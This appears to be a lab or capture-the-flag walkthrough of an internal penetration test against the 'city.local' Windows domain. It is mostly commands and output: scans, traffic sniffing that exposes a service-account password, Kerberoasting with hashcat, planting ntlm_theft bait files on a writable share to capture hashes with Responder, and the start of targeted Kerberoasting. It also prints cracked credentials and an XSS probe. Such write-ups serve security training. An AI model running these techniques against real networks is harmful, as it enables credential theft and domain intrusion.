# Objective and scope
A local municipality recently survived a devastating ransomware campaign. While their internal IT team believes the infection has been purged and the holes plugged, the Board of Supervisors isn't taking any chances. They’ve brought in **Hack Smarter** to provide a "second pair of eyes."

Your mission is to perform a comprehensive penetration test of the internal infrastructure. Reaching Domain Admin isn't the endgame; treat this like a real engagement. See how many vulnerabilities you're able to identify.
# Generating hosts file
```python
sudo nxc smb 10.0.24.231 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
nmap -p- --min-rate=3000 city.local                                                              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 16:58 +0000
Nmap scan report for city.local (10.0.24.231)
Host is up (0.091s latency).
rDNS record for 10.0.24.231: DC-CC.city.local
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49676/tcp open  unknown
49688/tcp open  unknown
49736/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 23.12 seconds
```
## Nmap
```python
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --min-rate=3000 city.local  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-06 17:01 +0000
Nmap scan report for city.local (10.0.24.231)
Host is up (0.090s latency).
rDNS record for 10.0.24.231: DC-CC.city.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus

80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: City Hall - Your Local Government
|_http-server-header: Microsoft-IIS/10.0

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-06 17:01:24Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: city.local, Site: Default-First-Site-Name)

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  tcpwrapped

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: city.local, Site: Default-First-Site-Name)

3269/tcp open  tcpwrapped

3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-03-06T17:01:46+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CITY
|   NetBIOS_Domain_Name: CITY
|   NetBIOS_Computer_Name: DC-CC
|   DNS_Domain_Name: city.local
|   DNS_Computer_Name: DC-CC.city.local
|   DNS_Tree_Name: city.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-03-06T17:01:38+00:00
| ssl-cert: Subject: commonName=DC-CC.city.local
| Not valid before: 2026-02-26T17:26:36
|_Not valid after:  2026-08-28T17:26:36

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

9389/tcp open  mc-nmf        .NET Message Framing

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|2012|2022|2016 (93%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (93%), Microsoft Windows 10 1909 (90%), Microsoft Windows 10 1909 - 2004 (90%), Windows Server 2019 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 20H2 - 21H1 (87%), Microsoft Windows 10 21H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: DC-CC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# HTTP (80)
## Nuclei
```python
nuclei -u http://city.local/       

[iis-shortname-detect] [http] [info] http://city.local/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://city.local/s7e5kafu*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://city.local/*~1*/a.aspx
[waf-detect:aspgeneric] [http] [info] http://city.local/
[waf-detect:modsecurity] [http] [info] http://city.local/
[rdp-detect] [javascript] [info] city.local:3389
[ldap-metadata] [javascript] [info] city.local:389 ["ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389","DnsHostName: DC-CC.city.local","DefaultNamingContext: DC=city,DC=local","DomainFunctionality: 7"]
[smb2-server-time] [javascript] [info] city.local:445 ["SystemTime: 2026-03-06T17:08:59.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] city.local:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb-version-detect:smb-version] [javascript] [info] city.local:445 ["SMB 2.1"]
[ldap-anonymous-login-detect] [javascript] [medium] city.local:389
[smb-enum] [javascript] [info] city.local:445 ["OSVersion: 10.0.17763","NetBIOSComputerName: DC-CC","NetBIOSDomainName: CITY","DNSComputerNamen: DC-CC.city.local","DNSComputerName: DC-CC.city.local","ForestName: city.local"]
[smb-enum-domains] [javascript] [info] city.local:445 ["DomainName: city.local"]
[smb-os-detect] [javascript] [info] city.local:445 ["Windows Server 2019, Version 1809"]
[rdp-detection:win2016] [tcp] [info] city.local:3389
[missing-sri] [http] [info] http://city.local/ ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"]
[microsoft-iis-version] [http] [info] http://city.local/ ["Microsoft-IIS/10.0"]
[fingerprinthub-web-fingerprints:landmark-dus] [http] [info] http://city.local/
[tech-detect:ms-iis] [http] [info] http://city.local/
[tech-detect:font-awesome] [http] [info] http://city.local/
[form-detection] [http] [info] http://city.local/
[old-copyright] [http] [info] http://city.local/ ["&copy; 2023"]
[http-missing-security-headers:strict-transport-security] [http] [info] http://city.local/
[http-missing-security-headers:content-security-policy] [http] [info] http://city.local/
[http-missing-security-headers:permissions-policy] [http] [info] http://city.local/
[http-missing-security-headers:x-frame-options] [http] [info] http://city.local/
[http-missing-security-headers:referrer-policy] [http] [info] http://city.local/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://city.local/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://city.local/
[http-missing-security-headers:x-content-type-options] [http] [info] http://city.local/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://city.local/
[http-missing-security-headers:clear-site-data] [http] [info] http://city.local/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://city.local/
[addeventlistener-detect] [http] [info] http://city.local/
[aspnet-version-detect] [http] [info] http://city.local/%3f ["4.0.30319"]
[INF] Skipped city.local:4040 from target list as found unresponsive permanently: cause="port closed or filtered" address=city.local:4040 chain="connection refused; got err while executing https://city.local:4040/jobs/?\"'><script>alert(document.domain)</script>"
[options-method] [http] [info] http://city.local/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[caa-fingerprint] [dns] [info] city.local
```
## Ffuf for subdomains
```python
nothing found
```
## Feroxbuster
```python
feroxbuster -u http://city.local/                                                                                                           

404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      149c http://city.local/uploads => http://city.local/uploads/
200      GET      761l     1904w    25807c http://city.local/faqs.html
200      GET      687l     1538w    23030c http://city.local/city-news.html
200      GET      723l     1877w    26031c http://city.local/documents-forms.html
200      GET      883l     1891w    29263c http://city.local/cc
200      GET      737l     1600w    24118c http://city.local/
301      GET        2l       10w      149c http://city.local/Uploads => http://city.local/Uploads/
404      GET       40l      156w     1888c http://city.local/con
404      GET       40l      156w     1896c http://city.local/uploads/con
404      GET       40l      156w     1896c http://city.local/Uploads/con
301      GET        2l       10w      149c http://city.local/UPLOADS => http://city.local/UPLOADS/
404      GET       40l      156w     1888c http://city.local/aux
404      GET       40l      156w     1896c http://city.local/uploads/aux
404      GET       40l      156w     1896c http://city.local/Uploads/aux
404      GET       40l      156w     1896c http://city.local/UPLOADS/con
404      GET       40l      156w     1896c http://city.local/UPLOADS/aux
400      GET        6l       26w      324c http://city.local/error%1F_log
400      GET        6l       26w      324c http://city.local/uploads/error%1F_log
400      GET        6l       26w      324c http://city.local/Uploads/error%1F_log
404      GET       40l      156w     1888c http://city.local/prn
404      GET       40l      156w     1896c http://city.local/uploads/prn
404      GET       40l      156w     1896c http://city.local/Uploads/prn
400      GET        6l       26w      324c http://city.local/UPLOADS/error%1F_log
404      GET       40l      156w     1896c http://city.local/UPLOADS/prn
```
## Website functionality
![](Pasted%20image%2020260406001135.png)
Found some users

```python
emma.hayes
jon.peters
rita.cho
nina.soto
```

## Shortname scanner
```python
msf auxiliary(scanner/http/iis_shortname_scanner) > run
[*] Running module against 10.0.24.231
[*] Scanning in progress...
[*] No directories were found
[+] Found 7 files
[+] http://10.0.24.231/faqs*~1.htm*
[+] http://10.0.24.231/index*~1.htm*
[+] http://10.0.24.231/city-n*~1.htm*
[+] http://10.0.24.231/city_s*~1.bin*
[+] http://10.0.24.231/city_s*~1.exe*
[+] http://10.0.24.231/docume*~1.htm*
[+] http://10.0.24.231/emerge*~1.htm*
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/iis_shortname_scanner) > 
```
All of these endpoints are showing a default IIS 404 page
# SMB (445)
There is nothing i can do with null authentication
The Guest account is disabled
# City council application (`.bin`)
I found a directory on the webpage that had an .exe and a .bin application that they have made
I found them at `documents-forms.html`
![](Pasted%20image%2020260406001307.png)
Each image has a log at the bottom and every submission uses the service account to authenticate
```python
[17:42:00] Validating application form...
[17:42:00] Connecting to City Council Directory Services...
[17:42:00] Using dedicated service account: svc_services_portal
[17:42:02] Performing LDAP bind request - Portal Service Authentication...
[17:42:03] Performing Search: citizen records database...
[17:42:04] Performing Validate: application eligibility criteria...
[17:42:04] Performing Update: service request tracking system...
[17:42:05] Performing Log: public services audit trail...
[17:42:06] Performing Verify: resident information consistency...
[17:42:07] Performing Process: automated workflow routing...
[17:42:08] Performing Update: municipal service database...
[17:42:08] Authenticating service account with DC-CC.city.local...
[17:42:08] ✓ Directory service authentication completed
[17:42:08] ✓ Application validated successfully
[17:42:08] ✓ Service request processed and logged
[17:42:08] ✓ Workflow routing completed
[17:42:08] ✓ Database update successful
```
From this log i can see there is a service account `svc_services_portal` 
Since this is authenticating to the service using that account its very possible creds are stored in the binary
Rather than setting up a tool like ghidra ill setup wireshark and try and find the password

# Compromising `svc_services_portal`
Ill setup wireshark to listen on `tun0` and remake the request and see the result
There is a short conversation between me and the DC and if i follow the TCP stream:
```python
USER=svc_services_portal PASS=PortAl1337 DOMAIN=city.local SERVICE=Business License Application
```

```python
nxc smb DC-CC.city.local -u svc_services_portal -p 'PortAl1337'
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\svc_services_portal:PortAl1337
```
I have successfully compromised the service account
## Access on the service account
```python
nxc smb DC-CC.city.local -u svc_services_portal -p 'PortAl1337' --shares
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\svc_services_portal:PortAl1337 
SMB         10.0.24.231     445    DC-CC            [*] Enumerated shares
SMB         10.0.24.231     445    DC-CC            Share           Permissions     Remark
SMB         10.0.24.231     445    DC-CC            -----           -----------     ------
SMB         10.0.24.231     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.0.24.231     445    DC-CC            Backups                         
SMB         10.0.24.231     445    DC-CC            C$                              Default share
SMB         10.0.24.231     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.0.24.231     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            Uploads
```
Only read privs on the default shares
Its worth noting that the  `uploads` share may be used at some point to plant a shell in then accessing this via the URL since i found a `/uploads` dir on the webapp then getting a reverse shell
There is no group policy passwords in the shares i have read access on

```python
nxc smb DC-CC.city.local -u svc_services_portal -p 'PortAl1337' --users-export users.txt
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\svc_services_portal:PortAl1337 
SMB         10.0.24.231     445    DC-CC            -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.0.24.231     445    DC-CC            Administrator                 2025-11-28 21:25:26 0       Built-in account for administering the computer/domain 
SMB         10.0.24.231     445    DC-CC            Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.0.24.231     445    DC-CC            krbtgt                        2025-10-24 13:57:52 0       Key Distribution Center Service Account 
SMB         10.0.24.231     445    DC-CC            clerk.john                    2025-10-24 14:26:28 0        
SMB         10.0.24.231     445    DC-CC            jon.peters                    2025-10-24 19:12:05 0        
SMB         10.0.24.231     445    DC-CC            emma.hayes                    2025-10-26 14:32:12 0        
SMB         10.0.24.231     445    DC-CC            sam.brooks                    2026-02-27 14:57:43 0        
SMB         10.0.24.231     445    DC-CC            web_admin                     2025-10-24 14:26:28 0       Dedicated administrative account for IIS web server infrastructure management and operations 
SMB         10.0.24.231     445    DC-CC            alex.king                     2025-10-24 14:26:28 0        
SMB         10.0.24.231     445    DC-CC            rita.cho                      2025-10-24 14:26:28 0        
SMB         10.0.24.231     445    DC-CC            maria.clerk                   2025-10-27 18:54:04 0        
SMB         10.0.24.231     445    DC-CC            paul.roberts                  2025-10-24 14:26:28 0        
SMB         10.0.24.231     445    DC-CC            nina.soto                     2025-10-29 15:32:00 0        
SMB         10.0.24.231     445    DC-CC            svc_services_portal           2025-10-31 19:13:05 0        
SMB         10.0.24.231     445    DC-CC            [*] Enumerated 14 local users: CITY
SMB         10.0.24.231     445    DC-CC            [*] Writing 14 local users to users.txt
```
Exported all users to a txt file
Now i have a userlist i tried some asrep roasting and found nothing
No passwords in user descriptions
# Kerberoasting leads to user compromise of `clerk.john`
```python
nxc ldap DC-CC.city.local -u svc_services_portal -p 'PortAl1337' --kerberoasting kerb.hash
LDAP        10.0.24.231     389    DC-CC            [*] Windows 10 / Server 2019 Build 17763 (name:DC-CC) (domain:city.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.24.231     389    DC-CC            [+] city.local\svc_services_portal:PortAl1337 
LDAP        10.0.24.231     389    DC-CC            [*] Skipping disabled account: krbtgt
LDAP        10.0.24.231     389    DC-CC            [*] Total of records returned 1
LDAP        10.0.24.231     389    DC-CC            [*] sAMAccountName: clerk.john, memberOf: [], pwdLastSet: 2025-10-24 15:26:28.614558, lastLogon: 2026-02-27 14:58:43.208008
LDAP        10.0.24.231     389    DC-CC            $krb5tgs$23$*clerk.john$CITY.LOCAL$city.local\clerk.john*$b23f18a7adb134766fc24a25ac6d9ad3$dcf0f2db12d1d6991eec1c198eaef91f876c762b0af50f9c600c2fa0bd895594ae83c86a3c3b6a782c7e1533e1c8f320588ce0bdebe9133c602a390dba7e6b29afcbd61c8be3759da1744993cd3320a28dd0837a529f1f0c03988fc5506afba765603099a7a4d990c84281bab273de56ca48e1857bc068d24e76f6e31468ab06766153c767a092d53c2ca59c239bb2f81e64d05e1dea7f3c359917914f80b36ef42d2c71dee7edeba37ba370080ed3f8c64fb58fa9f3b65e4136a641845d4552d85298c40ce523cbff6bba6f2db655184641d509dc643cb0cfe9bf85dcd00223d33221a4ab27f3a2a58d06fed13f706b9b10fb01a7ea9b1742f25414531a5ff6d3c078d3cb20718784e5f6deaa15b27d18dca3a61c17f9681d525b74d7bcae3245b7d634446d9e0bacf0c948ca3d58a2ae3c67bba4a528b3b5331ed63eaf0a37705424c8205f8d60d427575df39a0cd08788029eaa52c2662e8a9019d85ee77349c6409da43020ddbbb2beed5f54f89390487f63440b9a6ad25f219e4ec4b6f0c9f39e7a592652da453bb952d007fbf7164b6fe70dc40b05920b864f4745d279e797e2a30b28d63e88082f64f5fd7a15fac5a7cf6e398189c5c73e041b9b8318e400bb052f87cdc756620b337184279f584e50bf58ed0ac965cae2a69353eeb755a65b5630308a8d1f167b8494d3e445f02a3a1568b27b7fdab9fb94bb916b96ed436f41e1cf8d03a4f609b5aa1ae2566a24b806c54882bb5e3151688cdaf16810376a84644a65acbb7802709396e01f521348e1ca4aa987bdeec742d58f5c5df2b16dc44757f480bfef8aa963aa786dcc670c651ca9209dfeb096da936db0eb68bcd94ead5de369b9acbad2bd7aeb3b20d46b68e3039e9547b6e7f0efe5e8a904cba52f227e594ac5bcb2caf9f90cf4d72a5872abe12c244ddaec039de21e4b907615b14a4e0dbb8586042a37eac467bae1387abb625f8de9710f3299afaab53049e37cffa6abe2d51c153f84be4c07febcf26b0642c0181b7eda5acbce0026c4d59a8ed3635cbc07b4cd76049f33ff4d40ef4e892b7de4b536a1d919228ea9a267210d8645c2d62330f890e284d3b87eb77599121883c9f7c4799da4b8828062a70e3d0848492a9b40d6cd26b8eddc8e13d452c11c9719e1a040d9905c6c29a23c2c8e391cdbf9cf553c42e4acdbedbacfd8c9cbc81e89cc9547e481382d92b85244351f4b5c17705f0e6939cfb4b1a2515eda9b1ef797aade7ec9a8276b7a4b1fd9fc8d086757e857d2674d387eda3b290e9b35b997211a2220e3a12fe3070be770c3c264229d735e86503b73dc30c416dfc9e7d30ecf17ea872337155d8f19f8ab16aa0263ee9db2ed49b942086881b80e08736612177098656a7772983213204956f84c46d458d9cdad7dedc867a1aad3e68e2281eab11f62042247f4feafe764d615974cb269587b9b6b379881a099d2cfdff29b7cd78c42b4bad3083b72b9432f7ba4e1e2f4854486d37097f79053965c740da198137b79419777611cea83462d3594af0a0141fb3d982fa282fdea3ad01983e5117238d5270880fef8b822d3c1256937193c611cf22075b0a45f507e4e7798bf279873c77e479e9d31514a595a887db519edef7663c18a
```
After getting the userlist and trying some asrep roasting i also tried some kerberoasting and got a hash

## Cracking the hash
```python
hashcat kerb.hash /usr/share/wordlists/rockyou.txt

$krb5tgs$23$*clerk.john$CITY.LOCAL$city.local\clerk.john*$b23f18a7adb134766fc24a25ac6d9ad3$dcf0f2db12d1d6991eec1c198eaef91f876c762b0af50f9c600c2fa0bd895594ae83c86a3c3b6a782c7e1533e1c8f320588ce0bdebe9133c602a390dba7e6b29afcbd61c8be3759da1744993cd3320a28dd0837a529f1f0c03988fc5506afba765603099a7a4d990c84281bab273de56ca48e1857bc068d24e76f6e31468ab06766153c767a092d53c2ca59c239bb2f81e64d05e1dea7f3c359917914f80b36ef42d2c71dee7edeba37ba370080ed3f8c64fb58fa9f3b65e4136a641845d4552d85298c40ce523cbff6bba6f2db655184641d509dc643cb0cfe9bf85dcd00223d33221a4ab27f3a2a58d06fed13f706b9b10fb01a7ea9b1742f25414531a5ff6d3c078d3cb20718784e5f6deaa15b27d18dca3a61c17f9681d525b74d7bcae3245b7d634446d9e0bacf0c948ca3d58a2ae3c67bba4a528b3b5331ed63eaf0a37705424c8205f8d60d427575df39a0cd08788029eaa52c2662e8a9019d85ee77349c6409da43020ddbbb2beed5f54f89390487f63440b9a6ad25f219e4ec4b6f0c9f39e7a592652da453bb952d007fbf7164b6fe70dc40b05920b864f4745d279e797e2a30b28d63e88082f64f5fd7a15fac5a7cf6e398189c5c73e041b9b8318e400bb052f87cdc756620b337184279f584e50bf58ed0ac965cae2a69353eeb755a65b5630308a8d1f167b8494d3e445f02a3a1568b27b7fdab9fb94bb916b96ed436f41e1cf8d03a4f609b5aa1ae2566a24b806c54882bb5e3151688cdaf16810376a84644a65acbb7802709396e01f521348e1ca4aa987bdeec742d58f5c5df2b16dc44757f480bfef8aa963aa786dcc670c651ca9209dfeb096da936db0eb68bcd94ead5de369b9acbad2bd7aeb3b20d46b68e3039e9547b6e7f0efe5e8a904cba52f227e594ac5bcb2caf9f90cf4d72a5872abe12c244ddaec039de21e4b907615b14a4e0dbb8586042a37eac467bae1387abb625f8de9710f3299afaab53049e37cffa6abe2d51c153f84be4c07febcf26b0642c0181b7eda5acbce0026c4d59a8ed3635cbc07b4cd76049f33ff4d40ef4e892b7de4b536a1d919228ea9a267210d8645c2d62330f890e284d3b87eb77599121883c9f7c4799da4b8828062a70e3d0848492a9b40d6cd26b8eddc8e13d452c11c9719e1a040d9905c6c29a23c2c8e391cdbf9cf553c42e4acdbedbacfd8c9cbc81e89cc9547e481382d92b85244351f4b5c17705f0e6939cfb4b1a2515eda9b1ef797aade7ec9a8276b7a4b1fd9fc8d086757e857d2674d387eda3b290e9b35b997211a2220e3a12fe3070be770c3c264229d735e86503b73dc30c416dfc9e7d30ecf17ea872337155d8f19f8ab16aa0263ee9db2ed49b942086881b80e08736612177098656a7772983213204956f84c46d458d9cdad7dedc867a1aad3e68e2281eab11f62042247f4feafe764d615974cb269587b9b6b379881a099d2cfdff29b7cd78c42b4bad3083b72b9432f7ba4e1e2f4854486d37097f79053965c740da198137b79419777611cea83462d3594af0a0141fb3d982fa282fdea3ad01983e5117238d5270880fef8b822d3c1256937193c611cf22075b0a45f507e4e7798bf279873c77e479e9d31514a595a887db519edef7663c18a:clerkhill
```
The hash cracked

```python
clerk.john:clerkhill
```
Now ill verify access as this user

```python
nxc ldap DC-CC.city.local -u 'clerk.john' -p 'clerkhill'            
LDAP        10.0.24.231     389    DC-CC            [*] Windows 10 / Server 2019 Build 17763 (name:DC-CC) (domain:city.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.24.231     389    DC-CC            [+] city.local\clerk.john:clerkhill
```
Another user compromised
He does not have access over RDP or WINRM
## Access on SMB
```python
nxc smb DC-CC.city.local -u 'clerk.john' -p 'clerkhill' --shares
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\clerk.john:clerkhill 
SMB         10.0.24.231     445    DC-CC            [*] Enumerated shares
SMB         10.0.24.231     445    DC-CC            Share           Permissions     Remark
SMB         10.0.24.231     445    DC-CC            -----           -----------     ------
SMB         10.0.24.231     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.0.24.231     445    DC-CC            Backups                         
SMB         10.0.24.231     445    DC-CC            C$                              Default share
SMB         10.0.24.231     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.0.24.231     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            Uploads         READ,WRITE
```
This user has write access on `Uploads`
I could try a watering hole attack but since the `/Uploads` exists on the webapp i think i might be trying to compromise `web_admin` via a reverse shell
# Watering hole attack
After attempting to get a reverse shell on from the upload directory using write access to the share and failing ill try a watering hole attack
```python
python3 ntlm_theft.py -g modern -s 10.200.38.216 -f meeting                        
/home/kali/hsm/CityCouncil/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Skipping SCF as it does not work on modern Windows
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Skipping zoom as it does not work on the latest versions
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Skipping Autorun.inf as it does not work on modern Windows
Skipping desktop.ini as it does not work on modern Windows
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
This generated the files 

```python
sudo responder -I tun0
```
This start my listener

```python
smbclient \\\\DC-CC.city.local\\Uploads -U 'clerk.john'%'clerkhill'
Try "help" to get a list of possible commands.
smb: \> mput meeting*
```
This planted the files

```python
[SMB] NTLMv2-SSP Client   : 10.0.24.231
[SMB] NTLMv2-SSP Username : CITY\jon.peters
[SMB] NTLMv2-SSP Hash     : jon.peters::CITY:dc2c2c99d7d65004:83AA287BD30276D55F5671C96A8E5450:010100000000000000DE8BD39AADDC01BAE8145EEBC01D98000000000200080047005A0058004D0001001E00570049004E002D00440039003500390044005A004D00550031005700470004003400570049004E002D00440039003500390044005A004D0055003100570047002E0047005A0058004D002E004C004F00430041004C000300140047005A0058004D002E004C004F00430041004C000500140047005A0058004D002E004C004F00430041004C000700080000DE8BD39AADDC01060004000200000008003000300000000000000000000000002000005C262013C6627758BE4647253B8B49215342941FDC4BC63232A6223ADA9EC7B10A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00330038002E003200310036000000000000000000
```
Now ive got a hash

## Cracking the hash
```python
hashcat jon-peters.hash /usr/share/wordlists/rockyou.txt

JON.PETERS::CITY:dc2c2c99d7d65004:83aa287bd30276d55f5671c96a8e5450:010100000000000000de8bd39aaddc01bae8145eebc01d98000000000200080047005a0058004d0001001e00570049004e002d00440039003500390044005a004d00550031005700470004003400570049004e002d00440039003500390044005a004d0055003100570047002e0047005a0058004d002e004c004f00430041004c000300140047005a0058004d002e004c004f00430041004c000500140047005a0058004d002e004c004f00430041004c000700080000de8bd39aaddc01060004000200000008003000300000000000000000000000002000005c262013c6627758be4647253b8b49215342941fdc4bc63232a6223ada9ec7b10a001000000000000000000000000000000000000900240063006900660073002f00310030002e003200300030002e00330038002e003200310036000000000000000000:1234heresjonny
```
The hash cracked

```python
jon.peters:1234heresjonny
```
Ill verify these creds

```python
nxc smb DC-CC.city.local -u 'jon.peters' -p '1234heresjonny' --shares
SMB         10.0.24.231     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.24.231     445    DC-CC            [+] city.local\jon.peters:1234heresjonny 
SMB         10.0.24.231     445    DC-CC            [*] Enumerated shares
SMB         10.0.24.231     445    DC-CC            Share           Permissions     Remark
SMB         10.0.24.231     445    DC-CC            -----           -----------     ------
SMB         10.0.24.231     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.0.24.231     445    DC-CC            Backups                         
SMB         10.0.24.231     445    DC-CC            C$                              Default share
SMB         10.0.24.231     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.0.24.231     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.0.24.231     445    DC-CC            Uploads         READ,WRITE
```
`jon.peters` now compromised, he has the same access to the shares as the previous user

# Bloodhound
![](Pasted%20image%2020260406001325.png)
The new user has GenericWrite over three users which means i should be able to compromise one of them!

# Targeted Kerberoast
Ill use targetedkerberoast.py to do this
```python
python3 targetedKerberoast.py -v -d 'city.local' -u 'jon.peters' -p '1234heresjonny'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (clerk.john)
